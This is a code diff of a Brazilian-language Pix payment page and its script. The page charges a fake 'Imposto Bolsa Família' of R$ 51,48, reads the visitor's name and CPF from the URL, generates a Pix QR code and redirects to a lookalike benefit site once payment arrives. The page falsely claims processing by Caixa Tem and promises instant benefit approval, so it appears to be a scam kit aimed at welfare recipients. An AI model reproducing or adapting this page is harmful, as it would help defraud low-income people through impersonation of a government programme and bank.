@@ -1,331 +1,89 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-  <meta charset="UTF-8">
-  <title>Pagamento Pix</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <style>
-    * { box-sizing: border-box; }
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      background: #fff;
-      color: #333;
-    }
-    .container {
-      max-width: 480px;
-      margin: 30px auto;
-      padding: 16px;
-    }
-    .produto-info {
-      display: flex;
-      gap: 12px;
-      margin-bottom: 20px;
-    }
-    .produto-info img {
-      width: 90px;
-      border-radius: 15px;
-      border: 1px solid #dbdbdb;
-    }
-    .produto-dados {
-      flex: 1;
-      text-align: left;
-    }
-    .produto-dados h3 {
-      margin: 0;
-      font-size: 16px;
-      padding-bottom: 4px;
-    }
-    .produto-dados .preco {
-      font-size: 20px;
-      color: #e53935;
-      font-weight: 600;
-    }
-    .produto-dados .cliente {
-      margin-top: 6px;
-      font-size: 15px;
-      color: #555;
-    }
-    .aguardando {
-      text-align: center;
-      margin-bottom: 12px;
-    }
-    .aguardando img {
-      width: 100px;
-    }
-    .aguardando p {
-      font-size: 16px;
-      color: #444;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 8px;
-    }
-    .aguardando p span {
-      animation: spin 1s linear infinite;
-      border: 3px solid #e53935;
-      border-radius: 50%;
-      border-right-color: transparent;
-      width: 16px;
-      height: 16px;
-      display: inline-block;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0); }
-      100% { transform: rotate(360deg); }
-    }
+<script>
+  let pixJaGerado = false;
 
-    .qr-area {
-      text-align: center;
+  function getParam(name) {
+    const url = new URL(window.location.href);
+    return url.searchParams.get(name) || '';
+  }
+
+  function copiarPix() {
+    const codigo = document.getElementById('pixCode').innerText;
+    navigator.clipboard.writeText(codigo).then(() => {
+      alert("Código Pix copiado!");
+    });
+  }
+
+  let tempo = 15 * 60;
+  const contador = setInterval(() => {
+    const minutos = String(Math.floor(tempo / 60)).padStart(2, '0');
+    const segundos = String(tempo % 60).padStart(2, '0');
+    document.getElementById("tempoRestante").innerText = `${minutos}:${segundos}`;
+    tempo--;
+    if (tempo < 0) clearInterval(contador);
+  }, 1000);
+
+  const checarStatus = async (id) => {
+    const res = await fetch(`/pix-status?id=${id}`);
+    const data = await res.json();
+    if (data.status === "PAID") {
+      clearInterval(verificador);
+      window.location.href = "https://novobeneficiobolsa.com.br/inicio/bolsa-up1/";
     }
-    .qr-area img {
-      width: 200px;
-      margin: 10px auto;
-    }
+  };
 
-    .contador {
-      width: 70%;
-      margin: 10px auto 0;
-      background: #fff5ee;
-      color: #e53935;
-      border: 2px solid #f6c1b8;
-      font-weight: 300;
-      text-align: center;
-      padding: 8px;
-      margin-top: 10px;
-      border-radius: 12px;
-      font-size: 16px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 6px;
-    }
+  let verificador;
+  async function gerarPix() {
+    if (pixJaGerado) return;
+    pixJaGerado = true;
 
-    .pix-code {
-      background: #f3f3f3;
-      padding: 10px;
-      margin: 20px 0 10px;
-      border-radius: 6px;
-      font-family: Arial, sans-serif; font-weight: 400; max-width: 100%; overflow-wrap: break-word;
-      font-size: 14px;
-      color: #222;
-    }
+    const nome = decodeURIComponent(getParam('nome') || 'Cliente Teste');
+    const cpf = getParam('cpf') || '00000000000';
 
-    .btn-copy {
-      position: relative;
-      overflow: hidden;
-      display: block;
-      width: 100%;
-      background: #f08a05;
-      color: white;
-      border: none;
-      border-radius: 3px;
-      padding: 14px;
-      font-size: 14px;
-      font-weight: 400;
-      cursor: pointer;
-      margin-bottom: 12px;
-    }
-    .btn-copy svg {
-      vertical-align: middle;
-      margin-right: 6px;
-    }
+    document.getElementById('nomeCliente').innerText = nome;
+    document.getElementById('cpfCliente').innerText = cpf;
 
-    .btn-copy::before {
-      content: "";
-      position: absolute;
-      top: -2px;
-      left: -2px;
-      width: calc(100% + 4px);
-      height: calc(100% + 4px);
-      border: 2px solid #8a05be;
-      border-radius: 10px;
-      animation: pulse 2s infinite;
-    }
-
-    @keyframes pulse {
-      0% { transform: scale(1); opacity: 0.8; }
-      100% { transform: scale(1.2); opacity: 0; }
-    }
-
-    .avisos {
-      font-size: 13px;
-      color: #444;
-      margin-top: 30px;
-      padding-left: 20px;
-      position: relative;
-    }
-    .avisos::before {
-      content: "<svg xmlns="http://www.w3.org/2000/svg" height="14" fill="#666" viewBox="0 0 24 24" width="14"><path d="M0 0h24v24H0z" fill="none"/><path d="M12 17a2 2 0 110-4 2 2 0 010 4zm6-6h-1V9a5 5 0 10-10 0v2H6a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2v-8a2 2 0 00-2-2zM8 9a4 4 0 118 0v2H8V9z"/></svg>";
-      position: absolute;
-      left: 0;
-      top: 1px;
-    }
-
-    .avisos2 {
-      font-size: 13px;
-      color: #444;
-      margin-top: 15px;
-      padding-left: 20px;
-      position: relative;
-    }
-    .avisos2::before {
-      content: "<svg xmlns="http://www.w3.org/2000/svg" height="14" fill="#666" viewBox="0 0 24 24" width="14"><path d="M0 0h24v24H0z" fill="none"/><path d="M15.07 1H8.93C8.42 1 8 1.42 8 1.93v1.14c0 .51.42.93.93.93h6.14c.51 0 .93-.42.93-.93V1.93c0-.51-.42-.93-.93-.93zM12 4C7.58 4 4 7.58 4 12s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm.5 13h-1v-6h1v6z"/></svg>";
-      position: absolute;
-      left: 0;
-      top: 1px;
-    }
-
-    @media screen and (max-width: 480px) {
-      .produto-info {
-        flex-direction: row; justify-content: flex-start;
-      }
-      .produto-dados { text-align: left; }
-        flex-direction: column;
-        align-items: center;
-        text-align: center;
-        justify-content: flex-start;
-        align-items: flex-start;
-      }
-      .produto-dados { text-align: left; }
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-
-<div style="background:#f4f4f6;padding:20px;margin-bottom:20px;border-radius:12px;border:1px solid #ccc;">
-  <div style="display:flex;justify-content:space-between;align-items:center;width:100%;">
-    <div>
-      <strong style="font-size:20px;color:#111;">Pagamento PIX</strong><br>
-      <span style="font-size:15px;color:#666;">Imposto Bolsa Família</span>
-    </div>
-    <div style="background:#e48b29;color:white;font-size:13px;padding:6px 16px;border-radius:10px;font-weight:bold;white-space:nowrap;">
-      Aguardando
-    </div>
-  </div>
-</div>
-
-    <div class="produto-info">
-      <img src="logo-webp.webp" />
-      <div class="produto-dados">
-        <h3>Imposto Bolsa Familia</h3>
-        <div class="preco">R$ 51,48</div>
-        <div class="cliente">
-          Nome: <span id="nomeCliente">---</span><br>
-          CPF: <span id="cpfCliente">---</span>
-        </div>
-      </div>
-    </div>
-
-    <div class="aguardando">
-      
-      <p><span></span> Aguardando pagamento PIX...</p>
-    </div>
-
-    <div class="qr-area">
-      <div id="qrCode"></div>
-      <div class="contador"><svg xmlns="http://www.w3.org/2000/svg" height="18" fill="#e53935" viewBox="0 0 24 24" width="18"><path d="M0 0h24v24H0V0z" fill="none"/><path d="M11 7h2v6l4.25 2.52-.75 1.23L11 14V7zm1-5C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg> PIX expira em <span id="tempoRestante">15:00</span></div>
-    </div>
-
-    <div class="pix-code" id="pixCode">Carregando código Pix...</div>
-    <button class="btn-copy" onclick="copiarPix()">
-      <svg xmlns="http://www.w3.org/2000/svg" height="18" viewBox="0 0 24 24" width="18" fill="#ffffff"><path d="M0 0h24v24H0V0z" fill="none"/><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
-      COPIAR CÓDIGO PIX
-    </button>
-
-    <div class="avisos">
-  <svg xmlns="http://www.w3.org/2000/svg" height="14" fill="#666" viewBox="0 0 24 24" width="14" style="margin-right:6px;"><path d="M0 0h24v24H0z" fill="none"/><path d="M12 17a2 2 0 110-4 2 2 0 010 4zm6-6h-1V9a5 5 0 10-10 0v2H6a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2v-8a2 2 0 00-2-2zM8 9a4 4 0 118 0v2H8V9z"/></svg>
-  Pagamento 100% seguro e processado pelo Caixa Tem.
-</div>
-    <div class="avisos2">
-  <svg xmlns="http://www.w3.org/2000/svg" height="14" fill="#666" viewBox="0 0 24 24" width="14" style="margin-right:6px;"><path d="M0 0h24v24H0z" fill="none"/><path d="M15.07 1H8.93C8.42 1 8 1.42 8 1.93v1.14c0 .51.42.93.93.93h6.14c.51 0 .93-.42.93-.93V1.93c0-.51-.42-.93-.93-.93zM12 4C7.58 4 4 7.58 4 12s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm.5 13h-1v-6h1v6z"/></svg>
-  Após o pagamento, seu benefício será aprovado em até 1 minuto, aguarde nesta página.
-</div>
-  </div>
-
-  <script>
-    function getParam(name) {
-      const url = new URL(window.location.href);
-      return url.searchParams.get(name) || '';
-    }
-
-    function copiarPix() {
-      const codigo = document.getElementById('pixCode').innerText;
-      navigator.clipboard.writeText(codigo).then(() => {
-        alert("Código Pix copiado!");
-      });
-    }
-
-    let tempo = 15 * 60;
-    const contador = setInterval(() => {
-      const minutos = String(Math.floor(tempo / 60)).padStart(2, '0');
-      const segundos = String(tempo % 60).padStart(2, '0');
-      document.getElementById("tempoRestante").innerText = `${minutos}:${segundos}`;
-      tempo--;
-      if (tempo < 0) clearInterval(contador);
-    }, 1000);
-
-    const checarStatus = async (id) => {
-      const res = await fetch(`/pix-status?id=${id}`);
-      const data = await res.json();
-      if (data.status === "PAID") {
-        clearInterval(verificador);
-        window.location.href = "https://novobeneficiobolsa.com.br/inicio/bolsa-up1/";
-      }
+    const body = {
+      identifier: "81xy74ektq",
+      amount: 51.48,
+      client: {
+        name: nome,
+        email: "default@email.com",
+        phone: "(11) 99999-9999",
+        document: cpf
+      },
+      products: [
+        {
+          id: "cmabolds900uzw7u9odlkozbn",
+          name: "Imposto Bolsa Familia",
+          quantity: 1,
+          price: 51.48
+        }
+      ],
+      dueDate: new Date(Date.now() + 10 * 60 * 1000).toISOString().split('.')[0] + 'Z',
+      metadata: {
+        origem: "automatica"
+      },
+      callbackUrl: "https://minha.api.com/pix/callback/ho5a2y9cdm"
     };
 
-    let verificador;
-    async function gerarPix() {
-      const nome = decodeURIComponent(getParam('nome') || 'Cliente Teste');
-      const cpf = getParam('cpf') || '00000000000';
+    const res = await fetch('/pix-duckfy', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
 
-      document.getElementById('nomeCliente').innerText = nome;
-      document.getElementById('cpfCliente').innerText = cpf;
-
-      const body = {
-        identifier: "81xy74ektq",
-        amount: 51.48,
-        client: {
-          name: nome,
-          email: "default@email.com",
-          phone: "(11) 99999-9999",
-          document: cpf
-        },
-        products: [
-          {
-            id: "cmabolds900uzw7u9odlkozbn",
-            name: "Imposto Bolsa Familia",
-            quantity: 1,
-            price: 51.48
-          }
-        ],
-        dueDate: new Date(Date.now() + 10 * 60 * 1000).toISOString().split('.')[0] + 'Z',
-        metadata: {
-          origem: "automatica"
-        },
-        callbackUrl: "https://minha.api.com/pix/callback/ho5a2y9cdm"
-      };
-
-      const res = await fetch('/pix-duckfy', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body)
-      });
-
-      const data = await res.json();
-      if (data.pix) {
-        let src = data.pix.base64;
-        if (!src.startsWith("data:image")) {
-          src = `data:image/png;base64,${src}`;
-        }
-        document.getElementById('qrCode').innerHTML = `<img src="${src}" alt="QR Code Pix" />`;
-        document.getElementById('pixCode').innerText = data.pix.code || "Código não disponível";
-        verificador = setInterval(() => checarStatus(data.transactionId || ""), 10000);
+    const data = await res.json();
+    if (data.pix) {
+      let src = data.pix.base64;
+      if (!src.startsWith("data:image")) {
+        src = `data:image/png;base64,${src}`;
       }
+      document.getElementById('qrCode').innerHTML = `<img src="${src}" alt="QR Code Pix" />`;
+      document.getElementById('pixCode').innerText = data.pix.code || "Código não disponível";
+      verificador = setInterval(() => checarStatus(data.transactionId || ""), 10000);
     }
+  }
 
-    gerarPix();
-  </script>
-</body>
-</html>
+  // Executa a função apenas uma vez quando a página estiver pronta
+  window.addEventListener('DOMContentLoaded', gerarPix);
+</script>
